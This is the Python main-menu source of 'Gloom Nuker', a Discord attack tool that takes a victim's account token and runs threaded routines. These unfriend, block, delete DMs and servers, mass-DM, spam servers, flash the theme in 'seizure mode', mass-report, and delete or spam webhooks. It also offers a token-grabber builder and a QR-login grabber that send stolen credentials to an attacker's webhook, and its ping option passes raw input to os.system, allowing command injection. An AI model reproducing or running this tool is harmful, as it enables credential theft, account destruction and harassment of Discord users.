# Gloom was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Gloom Nuker under the GNU General Public Liscense v2 (1991).

import sys
sys.dont_write_bytecode = True

import multiprocessing
import keyboard
import base64

import string
from func.plugins.common import *
import func.accountNuke
import func.dmdeleter
import func.info
import func.login
import func.groupchat_spammer
import func.massreport
import func.QR_Grabber
import func.seizure
import func.server_leaver
import func.spamservers
import func.profilechanger
import func.friend_blocker
import func.create_token_grabber
import func.unfriender
import func.webhookspammer
import func.massdm

threads = 3
cancel_key = "ctrl+x"

clear
def main():
    setTitle(f"Gloom 1.0.0")
    clear()
    global threads
    global cancel_key
    print(f'''
{Fore.BLUE}  Welcome{Fore.BLUE} to      
               O))))   O))          O))))         O))))     O))       O))
             O)    O)) O))        O))    O))    O))    O))  O) O))   O)))     
            O))        O))      O))        O))O))        O))O)) O)) O O))
            O))        O))      O))        O))O))        O))O))  O))  O))     > dsc.gg/gloomx
            O))   O))))O))      O))        O))O))        O))O))   O)  O))
             O))    O) O))        O))     O))   O))     O)) O))       O))
              O)))))   O))))))))    O))))         O))))     O))       O))
                                                             '''.replace('O', f'{Fore.WHITE}){Fore.BLUE}') + f'''   
{Fore.WHITE}==================================================================================================={Fore.RESET}
{Fore.BLUE}[{Fore.RESET}1{Fore.BLUE}] {Fore.RESET}bomb account               |{Fore.BLUE}[{Fore.RESET}10{Fore.BLUE}] {Fore.RESET}block friends               | {Fore.BLUE}[{Fore.RESET}19{Fore.BLUE}]{Fore.RESET} bot nuker
{Fore.BLUE}[{Fore.RESET}2{Fore.BLUE}] {Fore.RESET}unfriend everyone          |{Fore.BLUE}[{Fore.RESET}11{Fore.BLUE}] {Fore.RESET}profile changer             | {Fore.BLUE}[{Fore.RESET}20{Fore.BLUE}]{Fore.RESET} server lookup
{Fore.BLUE}[{Fore.RESET}3{Fore.BLUE}] {Fore.RESET}delete all servers         |{Fore.BLUE}[{Fore.RESET}12{Fore.BLUE}] {Fore.RESET}ip pinger                   | {Fore.BLUE}[{Fore.RESET}21{Fore.BLUE}] {Fore.RESET}settings
{Fore.BLUE}[{Fore.RESET}4{Fore.BLUE}] {Fore.RESET}spam new servers           |{Fore.BLUE}[{Fore.RESET}13{Fore.BLUE}] {Fore.RESET}token grabber               |
{Fore.BLUE}[{Fore.RESET}5{Fore.BLUE}] {Fore.RESET}delete all dms             |{Fore.BLUE}[{Fore.RESET}14{Fore.BLUE}] {Fore.RESET}qr grabber                  |
{Fore.BLUE}[{Fore.RESET}6{Fore.BLUE}] {Fore.RESET}dm everyone                |{Fore.BLUE}[{Fore.RESET}15{Fore.BLUE}] {Fore.RESET}mass reporter               |
{Fore.BLUE}[{Fore.RESET}7{Fore.BLUE}] {Fore.RESET}enable lightning           |{Fore.BLUE}[{Fore.RESET}16{Fore.BLUE}] {Fore.RESET}groupchat creator           |
{Fore.BLUE}[{Fore.RESET}8{Fore.BLUE}] {Fore.RESET}token info                 |{Fore.BLUE}[{Fore.RESET}17{Fore.BLUE}] {Fore.RESET}webhook compromiser         |
{Fore.BLUE}[{Fore.RESET}9{Fore.BLUE}] {Fore.RESET}login with token           |{Fore.BLUE}[{Fore.RESET}18{Fore.BLUE}] {Fore.RESET}discord acc method          |  
{Fore.WHITE}===================================================================================================''')

    choice = input(
            f'{Fore.RESET}> {Fore.RESET}input: {Fore.BLUE}')
    #all options
    if choice == "1":
        token = input(
            f'{Fore.RESET}> {Fore.RESET}token: {Fore.BLUE}')
        validateToken(token)
        Server_Name = str(input(
            f'{Fore.RESET}> {Fore.RESET}name of the server that will be made?: {Fore.BLUE}'))
        message_Content = str(input(
            f'{Fore.RESET}> {Fore.RESET}message that will be sent to dms: {Fore.BLUE}'))
        if threading.active_count() < threads:
            threading.Thread(target=func.accountNuke.Gloom_Nuke, args=(token, Server_Name, message_Content)).start()
            return


    elif choice == '2':
        token = input(
            f'{Fore.RESET}> {Fore.RESET}token: {Fore.BLUE}')
        validateToken(token)
        #check if they're lonely and don't have any friends
        if not requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json():
            print(f"")
            sleep(3)
            main()
        #get all friends
        processes = []
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies=proxy(), headers=getheaders(token)).json()
        if not friendIds:
            print(f"{Fore.RESET}no friends found")
            sleep(3)
            main()
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = threading.Thread(target=func.unfriender.UnFriender, args=(token, friend))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(f'{Fore.RESET}> {Fore.RESET}press any key to continue. . . {Fore.BLUE}')
        sleep(1.5)
        main()


    elif choice == '3':
        token = input(
            f'{Fore.RESET}> {Fore.RESET}Token: {Fore.BLUE}')
        validateToken(token)
        if token.startswith("mfa."):
            print(f'{Fore.RESET}[{Fore.BLUE}Error{Fore.RESET}] : cant delete servers. 2fa enabled.')
            sleep(3)
        processes = []
        #get all servers
        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
        if not guildsIds:
            SlowPrint(f"{Fore.RESET}no servers found")
            sleep(3)
            main()
        for guild in [guildsIds[i:i+3] for i in range(0, len(guildsIds), 3)]:
            t = threading.Thread(target=func.server_leaver.Leaver, args=(token, guild))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(f'{Fore.RESET}> {Fore.RESET}press any key to continue. . . {Fore.BLUE}')
        sleep(1.5)
        main()
                

    elif choice == '4':
        token = input(f'{Fore.RESET}> {Fore.RESET}Token: {Fore.BLUE}')
        validateToken(token)
        print(f'{Fore.BLUE}Do you want to have a icon for the servers that will be created?')
        yesno = input(f'{Fore.RESET}> {Fore.RESET}yes/no: {Fore.BLUE}')
        if yesno.lower() == "y" or yesno.lower() == "yes":
            image = input(f'Example: (C:\\Users\\myName\\Desktop\\GloomNuker\\ShitOn.png):\n{Fore.RESET}> {Fore.RESET}Please input the icon location: {Fore.BLUE}')
            if not os.path.exists(image):
                print(f'{Fore.RESET}[{Fore.BLUE}Error{Fore.RESET}] : Couldn\'t find "{image}" on your pc')
                sleep(3)
                main()
            with open(image, "rb") as f: _image = f.read()
            b64Bytes = base64.b64encode(_image)
            icon = f"data:image/x-icon;base64,{b64Bytes.decode()}"
        else:
            icon = None
        print(f'''
    {Fore.RESET}[{Fore.BLUE}1{Fore.RESET}] Random server names
    {Fore.RESET}[{Fore.BLUE}2{Fore.RESET}] Custom server names  
                        ''')
        secondchoice = input(
            f'{Fore.RESET}> {Fore.RESET}Second Choice: {Fore.BLUE}')
        if secondchoice not in ["1", "2"]:
            print(f'{Fore.RESET}[{Fore.BLUE}Error{Fore.RESET}] : Invalid Second Choice')
            sleep(1)
            main()
        if secondchoice == "1":
            amount = 25
            processes = []
            if hasNitroBoost(token):
                amount = 50
            for i in range(amount):
                t = threading.Thread(target=func.spamservers.SpamServers, args=(token, icon))
                t.start()
                processes.append(t)
            for process in processes:
                process.join()
            input(f'{Fore.RESET}> {Fore.RESET}press any key to continue. . . {Fore.BLUE}')
            sleep(1.5)
            main()

        if secondchoice == "2":
            name = input(
                f'{Fore.RESET}> {Fore.RESET}Name of the servers that will be created: {Fore.BLUE}')
            processes = []
            for i in range(25):
                t = threading.Thread(target=func.spamservers.SpamServers, args=(token, icon, name))
                t.start()
                processes.append(t)
            for process in processes:
                process.join()
            input(f'{Fore.RESET}> {Fore.RESET}press any key to continue. . . {Fore.BLUE}')
            sleep(1.5)
            main()


    elif choice == '5':
        token = input(
            f'{Fore.RESET}> {Fore.RESET}Token: {Fore.BLUE}')
        validateToken(token)
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        if not channelIds:
            print(f"{Fore.RESET}Damn this guy is lonely, he aint got no dm's ")
            sleep(3)
            main()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
                t = threading.Thread(target=func.dmdeleter.DmDeleter, args=(token, channel))
                t.start()
                processes.append(t)
        for process in processes:
            process.join()
        input(f'{Fore.RESET}> {Fore.RESET}press any key to continue. . . {Fore.BLUE}')
        sleep(1.5)
        main()


    elif choice == '6':
        token = input(
            f'{Fore.RESET}> {Fore.RESET}Token: {Fore.BLUE}')
        validateToken(token)
        message = str(input(
            f'{Fore.RESET}> {Fore.RESET}Message that will be sent to every friend: {Fore.BLUE}'))
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        if not channelIds:
            print(f"{Fore.RESET}Damn this guy is lonely, he aint got no dm's ")
            sleep(3)
            main()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
            t = threading.Thread(target=func.massdm.MassDM, args=(token, channel, message))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(f'{Fore.RESET}> {Fore.RESET}press any key to continue. . . {Fore.BLUE}')
        sleep(1.5)
        main()


    elif choice == '7':
        token = input(
            f'{Fore.RESET}> {Fore.RESET}Token: {Fore.BLUE}')
        validateToken(token)
        print(f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
        SlowPrint(f"{Fore.BLUE}{cancel_key}{Fore.RESET} at anytime to stop")
        processes = [] 
        for i in range(threads):
            t = multiprocessing.Process(target=func.seizure.StartSeizure, args=(token, ))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break

    elif choice == '8':
        token = input(
        f'{Fore.RESET}> {Fore.RESET}Token: {Fore.BLUE}')
        validateToken(token)
        func.info.Info(token)


    elif choice == '9':
        token = input(
            f'{Fore.RESET}> {Fore.RESET}Token: {Fore.BLUE}')
        validateToken(token)
        func.login.TokenLogin(token)

    elif choice == '10':
        token = input(
            f'{Fore.RESET}> {Fore.RESET}Token: {Fore.BLUE}')
        validateToken(token)
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies=proxy(), headers=getheaders(token)).json()
        if not friendIds:
            print(f"{Fore.RESET}Damn this guy is lonely, he aint got no friends ")
            sleep(3)
            main()
        processes = []
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = threading.Thread(target=func.friend_blocker.Block, args=(token, friend))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(f'{Fore.RESET}> {Fore.RESET}press any key to continue. . . {Fore.BLUE}')
        sleep(1.5)
        main()


    elif choice == '11':
        token = input(
            f'{Fore.RESET}> {Fore.RESET}Token: {Fore.BLUE}')
        validateToken(token)
        print(f'''
    {Fore.RESET}[{Fore.BLUE}1{Fore.RESET}] Status changer
    {Fore.RESET}[{Fore.BLUE}2{Fore.RESET}] Bio changer
    {Fore.RESET}[{Fore.BLUE}3{Fore.RESET}] HypeSquad changer    
                        ''')
        secondchoice = input(
            f'{Fore.RESET}> {Fore.RESET}Setting: {Fore.BLUE}')
        if secondchoice not in ["1", "2", "3"]:
            print(f'{Fore.RESET}[{Fore.BLUE}Error{Fore.RESET}] : Invalid choice')
            sleep(1)
            main()
        if secondchoice == "1":
            status = input(
                f'{Fore.RESET}> {Fore.RESET}Custom Status: {Fore.BLUE}')
            func.profilechanger.StatusChanger(token, status)

        if secondchoice == "2":
            bio = input(
                f'{Fore.RESET}> {Fore.RESET}Custom bio: {Fore.BLUE}')
            func.profilechanger.BioChanger(token, bio)

        if secondchoice == "3":
            print(f'''
{Fore.RESET}[{Fore.MAGENTA}1{Fore.RESET}]{Fore.MAGENTA} HypeSquad Bravery
{Fore.RESET}[{Fore.BLUE}2{Fore.RESET}]{Fore.LIGHTRED_EX} HypeSquad Brilliance
{Fore.RESET}[{Fore.LIGHTGREEN_EX}3{Fore.RESET}]{Fore.LIGHTGREEN_EX} HypeSquad Balance
                        ''')
            thirdchoice = input(
                f'{Fore.RESET}> {Fore.RESET}Hypesquad: {Fore.BLUE}')
            if thirdchoice not in ["1", "2", "3"]:
                print(f'{Fore.RESET}[{Fore.BLUE}Error{Fore.RESET}] : Invalid choice')
                sleep(1)
                main()
            if thirdchoice == "1":
                func.profilechanger.HouseChanger(token, 1)
            if thirdchoice == "2":
                func.profilechanger.HouseChanger(token, 2)
            if thirdchoice == "3":
                func.profilechanger.HouseChanger(token, 3)


    elif choice == '12':
        setTitle(f"Gloom 1.0.0 @ IP Pinger")
        ip = input(f"Whats the IP you want to ping? :{Fore.RESET} ")
        os.system("ping "+ip)
        sleep(3)
        main()

        
    elif choice == '13':
        WebHook = input(
            f'{Fore.RESET}> {Fore.RESET}Webhook Url: {Fore.BLUE}')
        validateWebhook(WebHook)
        fileName = str(input(
            f'{Fore.RESET}> {Fore.RESET}File name: {Fore.BLUE}'))
        func.create_token_grabber.TokenGrabberV2(WebHook, fileName)


    elif choice == '14':
        WebHook = input(
            f'{Fore.RESET}> {Fore.RESET}Webhook Url: {Fore.BLUE}')
        validateWebhook(WebHook)
        func.QR_Grabber.QR_Grabber(WebHook)


    elif choice == '15':
        print(f"\n{Fore.BLUE}(the token you input is the account that will send the reports){Fore.RESET}")
        token = input(
            f'{Fore.RESET}> {Fore.RESET}Token: {Fore.BLUE}')
        validateToken(token)
        guild_id1 = str(input(
            f'{Fore.RESET}> {Fore.RESET}Server ID: {Fore.BLUE}'))
        channel_id1 = str(input(
            f'{Fore.RESET}> {Fore.RESET}Channel ID: {Fore.BLUE}'))
        message_id1 = str(input(
            f'{Fore.RESET}> {Fore.RESET}Message ID: {Fore.BLUE}'))
        reason1 = str(input(
            '\n[1] Illegal content\n'
            '[2] Harassment\n'
            '[3] Spam or phishing links\n'
            '[4] Self-harm\n'
            '[5] NSFW content\n\n'
            f'{Fore.RESET}> {Fore.RESET}Reason: {Fore.BLUE}'))
        if reason1.upper() in ('1', 'ILLEGAL CONTENT'):
            reason1 = 0
        elif reason1.upper() in ('2', 'HARASSMENT'):
            reason1 = 1
        elif reason1.upper() in ('3', 'SPAM OR PHISHING LINKS'):
            reason1 = 2
        elif reason1.upper() in ('4', 'SELF-HARM'):
            reason1 = 3
        elif reason1.upper() in ('5', 'NSFW CONTENT'):
            reason1 = 4
        else:
            print(f"\nInvalid reason")
            sleep(1)
            main()
        func.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1)


    elif choice == "16":
        token = input(
            f'{Fore.RESET}> {Fore.RESET}Token: {Fore.BLUE}')
        validateToken(token)
        func.groupchat_spammer.GcSpammer(token)


    elif choice == '17':
        print(f'''
    {Fore.RESET}[{Fore.BLUE}1{Fore.RESET}] Webhook Deleter
    {Fore.RESET}[{Fore.BLUE}2{Fore.RESET}] Webhook Spammer    
                        ''')
        secondchoice = int(input(
            f'{Fore.RESET}> {Fore.RESET}Second Choice: {Fore.BLUE}'))
        if secondchoice not in [1, 2]:
            print(f'{Fore.RESET}[{Fore.BLUE}Error{Fore.RESET}] : Invalid Second Choice')
            sleep(1)
            main()
        if secondchoice == 1:
            WebHook = input(
                f'{Fore.RESET}> {Fore.RESET}Webhook: {Fore.BLUE}')
            validateWebhook(WebHook)
            try:
                requests.delete(WebHook)
                print(f'\n{Fore.GREEN}Webhook Successfully Deleted!{Fore.RESET}\n')
            except Exception as e:
                print(f'{Fore.BLUE}Error: {Fore.WHITE}{e} {Fore.BLUE}happened while trying to delete the Webhook')

            input(f'{Fore.RESET}> {Fore.RESET}press any key to continue. . . {Fore.BLUE}')
            main()
        if secondchoice == 2:
            WebHook = input(
                f'{Fore.RESET}> {Fore.RESET}Webhook: {Fore.BLUE}')
            validateWebhook(WebHook)
            Message = str(input(
                f'{Fore.RESET}> {Fore.RESET}Message: {Fore.BLUE}'))
            func.webhookspammer.WebhookSpammer(WebHook, Message)

    elif choice == '18':
        SlowPrint(f"Press Open Discord in your browser\n After type in a name.\nTo verify your gmail use https://www.emailnator.com/\n The rest is pretty straight forward")
        os.system('start msedge.exe "https://discord.com"')
        sleep(12)
        main()




    elif choice == '19':
        print(f'{Fore.BLUE}Coming in next update. For now, use these.')
        os.system('start msedge.exe "https://github.com/search?q=discord+nuker&type=Repositories"')
        sleep(5)
        main()


    elif choice == '20':
        setTitle('Gloom 1.0.0 @ Server Lookup')
        exec(open('func/serverlookup.py').read())
        (main)



    elif choice == '21':
        clear
        print(f'''
    {Fore.RESET}[{Fore.BLUE}1{Fore.RESET}] Amount of threads
    {Fore.RESET}[{Fore.BLUE}2{Fore.RESET}] Cancel key
    {Fore.RESET}[{Fore.BLUE}3{Fore.RESET}] {Fore.BLUE}Exit...
    {Fore.RESET}[{Fore.BLUE}4{Fore.RESET}] Back    
                        ''')
        secondchoice = input(
            f'{Fore.RESET}> {Fore.RESET}Setting: {Fore.BLUE}')
        if secondchoice not in ["1", "2", "3", "4",]:
            print(f'{Fore.RESET}[{Fore.BLUE}error{Fore.RESET}] : choose a valid option')
            sleep(1)
            main()

        elif secondchoice == "1":
            print(f"{Fore.BLUE}current amount of threads: {threads}")
            try:
                amount = int(
                    input(f'{Fore.RESET}> {Fore.RESET}Amount of threads: {Fore.BLUE}'))
            except ValueError:
                print(f'{Fore.RESET}[{Fore.BLUE}Error{Fore.RESET}] : Invalid amount')
                sleep(1.5)
                main()
            if amount >= 45:
                print(f"{Fore.BLUE}having this many threads will just get you ratelimited.")
                sleep(3)
                main()
            elif amount >= 15:
                print(f"{Fore.BLUE}WARNING! * WARNING! * WARNING! * WARNING! * WARNING! * WARNING! * WARNING!")
                print(f"having the thread amount set to 15 or over can possible get laggy and higher chance of ratelimit\nare you sure you want to set the ratelimit to {Fore.RED}{amount}{Fore.BLUE}?")
                yesno = input(f'{Fore.RESET}> {Fore.RESET}yes/no: {Fore.BLUE}')
                if yesno.lower() != "yes":
                    sleep(0.5)
                    main()
            threads = amount
            SlowPrint(f"{Fore.GREEN}Threads set to {Fore.CYAN}{amount}")
            sleep(0.5)
            main()
        
        elif secondchoice == "2":
            print("\n","Info".center(30, "-"))
            print(f"{Fore.CYAN}Current cancel key: {cancel_key}")
            print(f"""{Fore.BLUE}If you want to have ctrl + <key> you need to type out ctrl+<key> | DON'T literally press ctrl + <key>
{Fore.GREEN}Example: shift+Q

{Fore.BLUE}You can have other modifiers instead of ctrl ⇣
{Fore.YELLOW}All keyboard modifiers:{Fore.RESET}
ctrl, shift, enter, esc, windows, left shift, right shift, left ctrl, right ctrl, alt gr, left alt, right alt
""")
            sleep(1.5)
            key = input(f'{Fore.RESET}> {Fore.RESET}Key: {Fore.BLUE}')
            cancel_key = key
            SlowPrint(f"{Fore.GREEN}Cancel key set to {Fore.CYAN}{cancel_key}")
            sleep(0.5)
            main()

        elif secondchoice == "3":
            setTitle("Exiting. . .")
            choice = input(
                f'{Fore.RESET}> {Fore.RESET}Are you sure you want to exit? (Y to confirm): {Fore.BLUE}')
            if choice.lower() == 'y' or choice.lower() == 'yes':
                clear()
                os._exit(0)
            else:
                main()
        elif secondchoice == "4":
            main()
    else:
        clear()
        main()

if __name__ == "__main__":
    import sys
    if os.path.basename(sys.argv[0]).endswith("exe"):
        with open(getTempDir()+"\\Gloom_proxies", 'w'): pass
        clear()
        proxy_scrape()
        sleep(1.5)
        main()
    try:
        assert sys.version_info >= (3,8)
    except AssertionError:
        print(f"{Fore.BLUE}Woopsie daisy, your python version ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) is not compatible with Gloom, please download python 3.7+")
        sleep(5)
        print("exiting. . .")
        sleep(1.5)
        os._exit(0)
    else:
        with open(getTempDir()+"\\Gloom_proxies", 'w'): pass
        clear()
        proxy_scrape()
        sleep(1.5)
        main()
    finally:
        Fore.RESET

# Gloom was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Gloom Nuker under the GNU General Public Liscense v2 (1991).
